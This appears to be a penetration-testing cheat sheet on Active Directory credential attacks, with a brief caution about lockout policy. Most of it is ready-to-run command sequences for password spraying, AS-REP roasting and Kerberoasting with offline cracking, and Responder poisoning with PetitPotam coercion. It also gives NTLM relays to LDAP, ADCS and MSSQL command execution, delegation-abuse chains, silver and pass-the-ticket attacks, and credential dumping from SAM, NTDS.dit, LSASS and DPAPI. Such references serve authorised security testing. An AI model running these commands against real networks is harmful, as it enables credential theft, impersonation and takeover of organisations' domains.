---
title: "Kerberos & Credential Attacks"
description: "AS-REP Roasting, Kerberoasting, delegation abuse, Net-NTLMv2 relaying, password spraying, and ticket-based attacks"
tags:
  - Active Directory
  - Kerberos
  - Kerberoasting
  - Relay
  - Credentials
---

# Kerberos & Credential Attacks

!!! note "What this page is doing"
    Credential testing is policy-aware. Read lockout and delegation settings first, use a dedicated account list and stop condition, and keep offline cracking, relay and coercion separate because they create different evidence and risks.

---

## 1. Username Enumeration & Password Spraying

```bash
# Username enumeration via Kerberos (no logs of failed logons — pre-auth failures only)
kerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
# Generate a username list from LDAP display names (first.last, f.last, last.first)
nxc ldap <DC_IP> -u '<USER>' -p 'Password123!' --query "(objectClass=user)" "sAMAccountName"
# SAFE password spraying — sleep between rounds to avoid lockout!
nxc smb <DC_IP> -u users.txt -p 'Summer2026!' --no-bruteforce --continue-on-success
# Spray against common passwords with lockout-aware delays
for pass in 'Password123!' 'Welcome1!' 'Summer2026!' 'Company@123' 'Changeme123!'; do
  nxc smb <DC_IP> -u users.txt -p "$pass" --continue-on-success --delay 30
  sleep 1800 # honor the domain lockout observation window
done
```

!!! danger "Lockout Policy First!"
    Always read the lockout policy before spraying: `nxc ldap <DC_IP> -u <USER> -p 'Pass' --pass-pol`.
    Calculate: `(LockoutThreshold / SprayRounds) * LockoutDuration` and space your attempts beyond it.

---

## 2. AS-REP Roasting (No Pre-Authentication)

Accounts with `DONT_REQ_PREAUTH` set allow you to request an AS-REP encrypted with their password hash — crackable offline. **No credentials required**, only a username list.

```bash
# From Linux with a user list
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -request -format hashcat -outputfile asrep_hashes.txt
# With credentials (asks LDAP for all vulnerable accounts)
impacket-GetNPUsers <DOMAIN>/'<USER>:Password123!' -dc-ip <DC_IP> -request
# From Windows
# Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
# Crack (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
john --wordlist=rockyou.txt --format=krb5asrep asrep_hashes.txt
```

---

## 3. Kerberoasting (Service Account Hash Extraction)

Any authenticated domain user can request a **service ticket (TGS)** for an account with an SPN. The ticket is encrypted with the service account's password hash → crack offline.

```bash
# 1. Enumerate accounts with SPNs (Kerberoastable)
impacket-GetUserSPNs <DOMAIN>/'<USER>:Password123!' -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt
nxc ldap <DC_IP> -u '<USER>' -p 'Password123!' --kerberoasting kerberoast.txt
nxc ldap <DC_IP> -u '<USER>' -p 'Password123!' --query "(servicePrincipalName=*)" "sAMAccountName"
# 2. Targeted request for a specific high-value SPN (e.g. MSSQLSvc, HTTP/web)
impacket-GetUserSPNs <DOMAIN>/'<USER>:Password123!' -dc-ip <DC_IP> -request-user svc_mssql
# 3. Crack (mode 13100, RC4) / (mode 19700, AES128) / (mode 19600, AES256)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
        --rules-file /usr/share/hashcat/rules/dive.rule
# 4. If RC4 is disabled, downgrade the ticket to RC4/etype 23 (often still accepted!)
impacket-GetUserSPNs <DOMAIN>/'<USER>:Password123!' -dc-ip <DC_IP> -request -request-user svc_sql
# In Rubeus: Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

---

## 4. Net-NTLMv2 Capture & Relay

=== " Capture (Responder + coercion)"

    ```bash
    # Start Responder (analyze first, then poison)
    sudo responder -I eth0 -wv
    sudo responder -I eth0 -wdF --lm
    # Coerce authentication from a target host using PetitPotam / Coercer / PrinterBug
    python3 PetitPotam.py -u '<USER>' -p 'Password123!' -d <DOMAIN> <LHOST> <TARGET_IP>
    python3 coercer.py coerce -l <LHOST> -t <TARGET_IP> -u '<USER>' -p 'Password123!' -d <DOMAIN>
    # Capture into a relay-ready format with ntlmrelayx
    impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of capture.txt
    impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i # Interactive SMB shell
    impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "powershell -e <BASE64>"
    ```

=== " Relay Targets & Escalation"

    ```bash
    # 1. Build the relay target list (hosts with SMB signing DISABLED)
    nxc smb 10.10.11.0/24 --gen-relay-list relay_targets.txt
    # 2. Relay to LDAP(S) -> grant DCSync / set RBCD / add to Domain Admins
    impacket-ntlmrelayx -t ldap://<DC_IP> -smb2support --escalate-user <USER>
    impacket-ntlmrelayx -t ldaps://<DC_IP> -smb2support --add-computer PWNED$ --delegate-access
    # 3. Relay to ADCS HTTP endpoint (ESC8) -> request a DC certificate!
    impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
    # 4. Relay to MSSQL -> xp_cmdshell RCE
    impacket-ntlmrelayx -t mssql://<SQL_IP> -smb2support --query "EXEC xp_cmdshell 'whoami'"
    # 5. Relay to Exchange / EWS -> mailbox access & write permissions
    ```

---

## 5. Delegation Attacks

| Delegation Type | Attribute | Attack |
| :--- | :--- | :--- |
| **Unconstrained** | `TRUSTED_FOR_DELEGATION` | Coerce a **DC** to authenticate to the host → capture its TGT from memory → DCSync. |
| **Constrained** | `msDS-AllowedToDelegateTo` | S4U2Self + S4U2Proxy → obtain a service ticket for a specified SPN. |
| **Resource-Based Constrained (RBCD)** | `msDS-AllowedToActOnBehalfOfOtherIdentity` | Write a computer account you control → S4U2 → impersonate any user on the target. |

```bash
# --- Unconstrained: coerce DC -> capture TGT (needs local admin on the delegation host) ---
python3 PetitPotam.py -u '<USER>' -p 'Password123!' -d <DOMAIN> <UNCONSTRAINED_HOST_IP> <DC_IP>
# Then on the host (Mimikatz/Rubeus) dump and reuse the DC's TGT:
# Rubeus.exe monitor /interval:5 /filteruser:DC01$
# Rubeus.exe ptt /ticket:<base64_tgt>
impacket-secretsdump -just-dc-user 'DC01$' '<DOMAIN>/<USER>:Password123!@<UNCONSTRAINED_HOST_IP>'
# --- Constrained: S4U2Self + S4U2Proxy for the allowed SPN ---
impacket-getST -spn cifs/<TARGET_HOST>.<DOMAIN> -impersonate Administrator \
    '<DOMAIN>/<SVC_USER>:Password123!' -dc-ip <DC_IP>
export KRB5CCNAME=Administrator@cifs_<TARGET_HOST>.<DOMAIN>@<DOMAIN>.ccache
impacket-psexec -k -no-pass <TARGET_HOST>.<DOMAIN>
# --- RBCD: full chain (write attribute -> S4U -> impersonate) ---
# 1. Create a machine account (MachineAccountQuota > 0 by default = 10)
impacket-addcomputer -computer-name 'PWNED$' -computer-pass 'P@ssw0rd123!' \
    -dc-ip <DC_IP> '<DOMAIN>/<USER>:Password123!'
# 2. Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
impacket-rbcd -delegate-from 'PWNED$' -delegate-to 'TARGET$' -action write \
    -dc-ip <DC_IP> '<DOMAIN>/<USER>:Password123!'
# 3. Request a service ticket via S4U as Administrator and use it
impacket-getST -spn cifs/TARGET.<DOMAIN> -impersonate Administrator \
    -dc-ip <DC_IP> '<DOMAIN>/PWNED$:P@ssw0rd123!'
export KRB5CCNAME=Administrator@cifs_TARGET.<DOMAIN>@<DOMAIN>.ccache
impacket-wmiexec -k -no-pass TARGET.<DOMAIN>
```

---

## 6. Ticket Attacks & Credential Extraction

```bash
# --- Overpass-the-Hash (NTLM hash -> Kerberos TGT) ---
impacket-getTGT <DOMAIN>/'<USER>' -hashes :<NTLM_HASH> -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache
# --- Pass-the-Ticket / Pass-the-Key ---
impacket-psexec -k -no-pass <TARGET_HOST>.<DOMAIN>
impacket-getTGT <DOMAIN>/'<USER>' -aesKey <AES256_KEY> -dc-ip <DC_IP>
# --- Silver Ticket (forge a TGS with a service account's hash — no DC contact!) ---
impacket-ticketer -nthash <SVC_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
    -spn cifs/<TARGET_HOST>.<DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass <TARGET_HOST>.<DOMAIN>
# --- Dump credentials from a host you have admin on ---
impacket-secretsdump '<DOMAIN>/<USER>:Password123!@<TARGET_IP>' # SAM + LSA + cached
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL # Offline hives
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL # Offline NTDS.dit
# --- Windows-side (Mimikatz / LSASS) ---
# privilege::debug
# sekurlsa::logonpasswords
# sekurlsa::ekeys
# lsadump::sam
# dpapi::cred /vault
# --- DPAPI: decrypt user secrets with the master key ---
impacket-dpapi masterkey -file <MASTERKEY_FILE> -sid <USER_SID> -password 'Password123!'
impacket-dpapi credential -file <CRED_FILE> -key <DECRYPTED_MASTERKEY>
```